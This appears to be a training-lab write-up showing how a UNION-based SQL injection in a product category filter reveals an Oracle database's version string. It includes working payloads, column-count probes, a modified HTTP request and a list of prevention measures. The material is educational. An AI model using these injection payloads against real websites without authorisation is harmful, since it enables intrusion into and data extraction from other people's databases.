# Lab 2: SQL Injection - Retrieving Oracle Database Version

## Objective
Exploit a SQL injection vulnerability in the product category filter to retrieve and display the Oracle database version on the screen.

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter. The database is Oracle, and the goal is to extract the database version information using a UNION-based SQL injection attack.

## Solution

### Tools Required
- **BurpSuite** (for intercepting and modifying requests)

### Attack Steps

#### Step 1: Identify the Vulnerable Parameter
The vulnerability exists in the category filter parameter:
```
something.com/category=some
```

#### Step 2: Determine the Number of Columns
Use the Oracle built-in table `dual` to determine how many columns the original query returns.

**Testing for column count:**
```sql
' UNION SELECT null FROM dual--
' UNION SELECT null,null FROM dual--
' UNION SELECT null,null,null FROM dual--
```

**Method:**
- Keep adding `null` values until you **don't** get an error
- When the query executes successfully, you've found the correct number of columns
- In this lab, the correct number was **2 columns**

#### Step 3: Extract Database Version
Once you know there are 2 columns, inject the payload to retrieve the database version:

```sql
' UNION SELECT banner,null FROM v$version--
```

#### Step 4: View the Results
The database version information will be displayed on the screen.

## Database Version Query Reference

Different databases store version information in different locations:

| Database | Query |
|----------|-------|
| **Oracle** | `SELECT banner FROM v$version` |
| Oracle (Alternative) | `SELECT version FROM v$instance` |
| **Microsoft SQL Server** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **MySQL** | `SELECT @@version` |

## Detailed Explanation

### Why Use the `dual` Table?
- `dual` is a special built-in table in Oracle
- It contains exactly one row and one column
- Perfect for testing queries without affecting actual data
- Required in Oracle for `SELECT` statements without a `FROM` clause target

### The UNION Attack Process

**Original Query (likely):**
```sql
SELECT product_name, description FROM products WHERE category='Gifts'
```

**Injection Payload:**
```sql
' UNION SELECT banner,null FROM v$version--
```

**Final Executed Query:**
```sql
SELECT product_name, description FROM products WHERE category='' 
UNION SELECT banner,null FROM v$version--'
```

### Breaking Down the Payload

```sql
' UNION SELECT banner,null FROM v$version--
```

- `'` - Closes the original string
- `UNION` - Combines results from two SELECT statements
- `SELECT banner,null` - Retrieves version info in first column, null in second
- `FROM v$version` - Oracle system view containing version information
- `--` - Comments out the rest of the original query

### Why Match Column Count?
- UNION requires both SELECT statements to have the **same number of columns**
- If column counts don't match, you'll get an error
- Use `null` as placeholders for columns you don't need

### Why Use `null`?
- `null` is compatible with any data type
- Allows us to match column count without knowing the exact data types
- Can be placed in any column position

## Using BurpSuite

### Intercept Process
1. Turn on **Intercept** in BurpSuite
2. Navigate to the category filter on the website
3. Select a category to generate the request
4. Intercept the request in BurpSuite
5. Modify the `category` parameter with your SQL injection payload
6. Forward the modified request
7. View the response in the browser

### Example Request Modification

**Original:**
```http
GET /filter?category=Gifts HTTP/1.1
Host: vulnerable-website.com
```

**Modified:**
```http
GET /filter?category=' UNION SELECT banner,null FROM v$version-- HTTP/1.1
Host: vulnerable-website.com
```

## Key Takeaways

1. **Column Count Matters**: UNION attacks require matching the number of columns
2. **Database-Specific Queries**: Different databases use different system tables/views
3. **The `dual` Table**: Oracle-specific table useful for testing
4. **Hit and Trial**: Finding column count requires systematic testing
5. **Comment Out Remainders**: Always comment out the rest of the original query with `--`

## Prevention Measures

- **Parameterized Queries**: Use prepared statements with bound parameters
- **Input Validation**: Whitelist allowed category values
- **Least Privilege**: Database user should not have access to `v$version`
- **WAF Rules**: Deploy Web Application Firewall to detect UNION attacks
- **Error Handling**: Don't display detailed SQL error messages to users
- **Database Hardening**: Restrict access to system views and tables

## Common Pitfalls

1. **Forgetting the Single Quote**: Must close the original string with `'`
2. **Wrong Column Count**: UNION will fail if column counts don't match
3. **Forgetting the Comment**: `--` is essential to comment out the rest of the query
4. **Space After Comment**: In some databases, need a space after `--` (e.g., `-- `)
5. **URL Encoding**: When using BurpSuite, be aware of URL encoding for special characters

## Status
✅ **Lab Completed** - Successfully retrieved and displayed Oracle database versions